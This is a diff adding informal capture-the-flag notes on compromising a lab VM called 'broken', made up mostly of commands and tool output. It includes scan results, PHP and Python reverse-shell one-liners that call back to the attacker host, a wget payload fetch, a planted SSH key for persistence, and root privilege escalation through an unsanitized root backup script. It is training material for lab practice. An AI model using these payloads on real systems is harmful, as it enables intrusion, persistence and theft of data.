@@ -1,0 +1,196 @@
+$ sudo nmap -sS -sV -A 192.168.2.104                                                                                          1 ⨯
+
+[sudo] password for kali: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 19:51 EDT
+Nmap scan report for 192.168.2.104
+Host is up (0.00055s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 7e:f3:33:8c:be:0c:ed:d7:0e:c6:67:cc:73:bf:c0:ab (RSA)
+|   256 ee:ed:74:02:0d:3f:7d:6d:45:aa:ff:f3:3a:d0:1a:d9 (ECDSA)
+|_  256 d1:18:a9:ef:7f:b6:c8:a9:30:52:c8:e6:b6:ec:64:80 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Coming Soon
+MAC Address: 08:00:27:03:98:64 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+└─$ dirb http://192.168.2.104:80 /usr/share/wordlists/dirb/common.txt                                                         130 ⨯
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun May 23 19:56:59 2021
+URL_BASE: http://192.168.2.104:80/
+WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.2.104:80/ ----
+==> DIRECTORY: http://192.168.2.104:80/cms/                                                                                        
+==> DIRECTORY: http://192.168.2.104:80/fonts/                                                                                      
+==> DIRECTORY: http://192.168.2.104:80/images/                                                                                     
++ http://192.168.2.104:80/index.html (CODE:200|SIZE:1494)                                                                          
++ http://192.168.2.104:80/server-status (CODE:403|SIZE:278)                                                                        
+                                                                                                                                   
+---- Entering directory: http://192.168.2.104:80/cms/ ----
++ http://192.168.2.104:80/cms/index.php (CODE:200|SIZE:438)                                                                        
+                                                                                                                                   
+---- Entering directory: http://192.168.2.104:80/fonts/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                   
+---- Entering directory: http://192.168.2.104:80/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Sun May 23 19:57:06 2021
+DOWNLOADED: 9224 - FOUND: 3
+
+
+http://192.168.2.104/cms/ install page
+clicked button, it did some kind of hacked based on next page viewed and then when i can view flag
+http://192.168.2.104/index.php hacked page
+back to cms page gives me {FLAG1:**Defacement**}
+
+dirbusting more finds /cms/cc
+provide host and ip to serve a file that gets executed
+it is making requests to the below address when host:ip are provided
+http://192.168.2.102:4444/0f41d3d1497fd9c89017eb521eaf3c61.sh
+put this in the file and host with python3 -m http.server
+php -r '$sock=fsockopen("ip-address",port);exec("/bin/sh -i <&3 >&3 2>&3");'
+setup listener with nc -nlvp 4444 and set the ipaddress to your ip and port to 4444, then press the "hackme" button
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4444                                            
+listening on [any] 4444 ...
+connect to [192.168.2.102] from (UNKNOWN) [192.168.2.104] 51170
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ ls
+e425ef56a6ca4a3101e775d5019fb237.txt
+fe8b7cfd24a4ad396054c8cd2f44d296.py
+index.php
+log.txt
+shell.sh
+$ hostname
+broken
+$ pwd
+/var/www/html/cms/cc
+$ uname -a
+Linux broken 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
+upgrade to full shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+move around server and see what we can find
+in / there is a flag.txt, but its empty
+www-data@broken:/home/alice$ cat flag.txt
+cat flag.txt
+{FLAG2:**Robing the rober**}
+www-data@broken:/home/alice$ pwd
+pwd
+/home/alice
+
+got user flag! nice
+lets install an ssh key for ease of use next time
+
+gotta escalate privileges to root
+only user is alice with /home/alice
+a note: 
+www-data@broken:/var/www/html/cms/cc$ cat /home/alice/note.txt
+cat /home/alice/note.txt
+Alice, 
+
+Please do not install TrustMeCMS, I need check the source before
+
+PS: I created a script to clear apache log during the tests
+
+root
+www-data@broken:/var/www/html/cms/cc$ cat /home/alice/script
+cat /home/alice/script
+cat: /home/alice/script: Is a directory
+www-data@broken:/var/www/html/cms/cc$ cat /home/alice/script/*
+cat /home/alice/script/*
+last clear apache log 2021-05-24 21:03:01.845536
+#!/usr/bin/python2.7
+import requests
+import os
+import datetime
+
+"""
+#Juste in case I want stop this script remotly
+
+r = requests.get("https://pastebin.com/raw/9vzu2CA5")
+
+cmd=str(r.text)
+check ="stopit"
+if check == cmd :
+        os.system('cp /home/alice/script/log.py /home/alice/script/log.bak')
+
+"""
+
+
+path="/var/log/apache2"
+dir = os.listdir(path)
+date = str(datetime.datetime.now())
+for logfile in dir :
+        clear = open(path+"/"+logfile, "w")
+        clear.truncate(0)
+        clear.close()
+logfile = open("/home/alice/script/clear.log","w")
+logfile.write("last clear apache log "+date)
+logfile.close()
+
+
+this file is writeable
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+copy over our log.py with wget http://192.168.2.102:8000/log.py  
+it runs, spawning a reverse shell on the port 5555
+we can upgrade to a tty python -c 'import pty; pty.spawn("/bin/bash")'
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqWif+lFSqeO8C/FPp8Rchnc/FniJVTgYzzedThvyM/rmqSjUK1vbaYnK+gYIUAEbE6HMys5rz7exPZYwfcI39kyEmcSJp9uzbsljLFncbv/i7nmYVWOnnH44kNMojtmqeTaZtmouTb6CARe8ZkpwHNLDq8ACM3bSNq7dDYCgqvKs6xZhkitDOHBYraDAtJgAKYShE1LCsB4HIQyyowG5jQLl54QxBzcLH7ckbO6cR+VxH8idyeyA7lNCKqoYKHShTyCbFnWbv7lqta1dUsoo70I/4voXPYRndUGIwx9v84AzjxM2P1gVp5m7GljSGJWQzEgNmgbNclzWoHflGswXjgziG1t2zLXAuBorPsm9xcA+S06J/U7rCToqGJmcnfQox9n9+AH5dlVespwE4QfjIWN2MCfw9aRoTUzaQEa8u/VqkkQgEF09za3ucT1/sNLEcMqbq4SToXlENFaTV/JPOSFuiwYuwtfAGTmlVDzqF2DZH0EXJvtEFwRO6zLxWzmM= kali@kali
+now i have ssh access!
+
+go to /home/alice/backup/flag.txt for {FLAG3:**Power of snak**}
+alice@broken:/$ cat /home/alice/backup/note.txt
+Alice we have been hacked !
+
+Please put the path of the website backup directory in path.txt, my bot will do the rest
+
+thx
+
+root
+
+
+this references a file /backup.py that the root user runs, which calls the path.txt file
+alice@broken:/$ cat backup.py
+import os
+import datetime
+size = os.path.getsize("/home/alice/backup/path.txt")
+
+if size > 3 :
+
+        file = open("/home/alice/backup/path.txt", "r")
+        path = file.read().strip()
+        file.close()
+        cmd = "rsync -a "+path+" /home/alice/backup --exclude back --exclude backup.py&& chown -R www-data:alice /home/alice/backup && chmod -R 777 /home/alice/backup"
+        os.system(cmd)
+date = str(datetime.datetime.now())
+log = open("/home/alice/backup/logbot.log", "w")
+log.write("last check : "+date)
+log.close()
+
+we can echo /root/ into path.txt and have the home dir of root read to us!So you get the final flag
+
